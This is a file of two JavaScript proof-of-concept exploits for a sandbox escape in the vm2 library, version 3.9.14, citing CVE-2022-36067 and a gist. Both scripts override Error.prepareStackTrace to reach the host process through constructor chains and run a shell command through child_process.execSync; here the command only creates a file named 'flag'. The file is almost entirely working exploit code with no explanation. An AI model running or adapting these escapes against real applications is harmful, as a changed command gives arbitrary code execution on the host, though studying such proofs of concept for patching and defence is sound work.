
//
//  https://gist.github.com/seongil-wi/2a44e082001b959bfe304b62121fb76d
//  https://www.oxeye.io/resources/vm2-sandbreak-vulnerability-cve-2022-36067 
//


vm2_3.9.14_exploit_1.js

```
const {VM} = require("vm2");
let vmInstance = new VM();

const code = `
Error.prepareStackTrace = (e, frames) => {
    frames.constructor.constructor('return process')().mainModule.require('child_process').execSync('touch flag'); 
};
(async ()=>{}).constructor('return process')()
`

vmInstance.run(code);
vm2_3.9.14_exploit_2.js
const {VM} = require("vm2");
let vmInstance = new VM();

const code = `
Error.prepareStackTrace = (e, frames) => {
    frames.constructor.constructor('return process')().mainModule.require('child_process').execSync('touch flag'); 
};
async function aa(){
    eval("1=1")
}
aa()
`

vmInstance.run(code);
